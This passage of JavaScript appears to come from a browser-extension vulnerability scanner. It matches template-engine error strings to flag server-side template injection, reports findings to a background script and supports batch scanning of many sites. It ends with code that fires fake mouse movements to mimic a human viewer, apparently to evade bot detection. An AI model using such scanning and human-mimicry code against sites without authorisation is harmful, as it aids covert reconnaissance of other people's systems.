    const templateErrorPatterns = [
      /Liquid error/i,
      /Twig_Error/i,
      /Smarty error/i,
      /Template syntax error/i,
      /Jinja2/i,
      /Django template/i,
      /ERB/i,
      /Thymeleaf/i,
      /FreeMarker/i,
      /Velocity/i,
      /Handlebars/i,
      /Mustache/i,
      /EJS/i
    ];
    
    for (const pattern of templateErrorPatterns) {
      if (pattern.test(responseText)) {
        this.recordVulnerability('Server-Side Template Injection', {
          evidence: `响应中包含模板引擎错误: ${responseText.match(pattern)[0]}`,
          location: window.location.href,
          severity: 'High',
          description: '可能存在服务器端模板注入(SSTI)漏洞，响应中包含模板引擎错误。'
        });
        return;
      }
    }
  }
  
  // 获取文本上下文
  getTextContext(text, target, contextLength = 50) {
    const index = text.indexOf(target);
    if (index === -1) return '';
    
    const start = Math.max(0, index - contextLength);
    const end = Math.min(text.length, index + target.length + contextLength);
    
    return text.substring(start, end);
  }
  
  // 记录漏洞
  recordVulnerability(type, details) {
    const vulnerability = {
      type,
      details,
      timestamp: new Date().toISOString()
    };
    
    this.foundVulnerabilities.push(vulnerability);
    
    // 发送消息到background script
    chrome.runtime.sendMessage({
      action: 'vulnerabilityDetected',
      vulnerability
    });
  }
}

// 初始化并启动检测
const analyzer = new DOMAnalyzer();

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'startDetection') {
    console.log('接收到检测请求:', request);
    
    // 设置扫描深度
    analyzer.scanDepth = request.scanDepth || 'medium';
    
    // 如果是批量扫描模式，记录相关信息
    if (request.batchMode) {
      console.log(`批量扫描中: ${request.batchIndex + 1}/${request.totalSites}`);
    }
    
    // 开始深度扫描
    analyzer.startDeepScan();
    
    // 发送响应，表示消息已接收
    sendResponse({ success: true, message: '已开始扫描' });
  } else if (request.action === 'fingerprintUpdated') {
    console.log('指纹已更新，重新加载指纹设置');
    // 这里可以添加重新加载指纹设置的代码
    
    // 发送响应
    sendResponse({ success: true, message: '已接收指纹更新通知' });
  }
  
  // 返回true表示将异步发送响应
  return true;
});

// 初始模拟眼动
setTimeout(() => {
  // 模拟页面载入后的首次浏览
  const viewportHeight = window.innerHeight;
  const viewportWidth = window.innerWidth;
  
  // 创建一系列的模拟注视点，从上到下扫视页面
  for (let i = 0; i < 5; i++) {
    setTimeout(() => {
      const x = viewportWidth / 2 + (Math.random() - 0.5) * 100;
      const y = viewportHeight * (0.2 + i * 0.15) + (Math.random() - 0.5) * 50;
      
      document.dispatchEvent(new MouseEvent('mousemove', {
        bubbles: true,
        clientX: x,
        clientY: y,
        view: window
      }));
    }, 300 * i + Math.random() * 200);
  }
}, 1000);